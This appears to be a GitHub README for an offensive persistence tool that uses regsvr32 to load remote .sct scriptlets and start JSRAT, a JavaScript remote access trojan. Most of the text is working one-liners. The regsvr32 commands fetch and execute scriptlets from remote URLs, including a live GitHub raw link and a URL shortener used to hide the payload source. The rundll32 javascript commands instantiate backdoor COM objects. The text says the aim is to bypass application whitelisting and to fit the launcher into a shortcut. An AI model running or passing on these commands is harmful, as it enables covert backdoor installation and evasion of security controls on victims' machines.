Another way of JSRAT on SCTPersistence.
---

Thanks to Casey Smith@subTee

https://github.com/subTee/SCTPersistence


His Way:


1.On host, execute regsvr32.exe /u /n /s /i:http://server/Backdoor.sct scrobj.dll


-The default is to use the path to a local file


-rewrite the regkey


-the Class definition comes form the interwebs http://server/c2.js


2.c2.js


-javascript payload


-.sct format


3.call the COM Object


-cmd


`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();x=new%20ActiveXObject("Component.Backdoor");x.Main();`


or


-js


`var x = new ActiveXObject("Component.Backdoor");
x.Main();
var x = new ActiveXObject("Component.Backdoor");
x.Exec();`


My Way:


1.On host, execute regsvr32.exe /u /n /s /i:http://server/Backdoor.sct scrobj.dll


-The default is to use the path to a local file


-Connect to the JSRAT server


2.call the COM Object


-cmd


`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();x=new%20ActiveXObject("Empire");x.Exec();`


-js


`var ref = new ActiveXObject("JSRAT");
ref.Exec();`




---
### Usage:

1.(local)


`regsvr32.exe /u /n /s /i:Backdoor.sct scrobj.dll`


or (remote)


`regsvr32.exe /u /n /s /i:http://example/Backdoor.sct scrobj.dll`


2.run BackdoorTest.js to start JSRAT



---
---

## ShortJSRAT
You can run the following code to start JSRAT:


`regsvr32 /s /n /u /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/ShortJSRAT.sct scrobj.dll`

### Why create this:

Limit command length to 260 characters.


When we create a Windows shortcut with personnalized icon to start JSRAT,the code of JSRAT is longer than 260charaters.


But we can use regsvr32.exe to run .sct file with very few letters.


What's more, the third-party link shortener Twitter can save more space.


Google url shortener,like this:


`regsvr32 /s /n /u /i:https://goo.gl/ijB12k scrobj.dll`


Details:

《Use SCT to Bypass Application Whitelisting Protection》




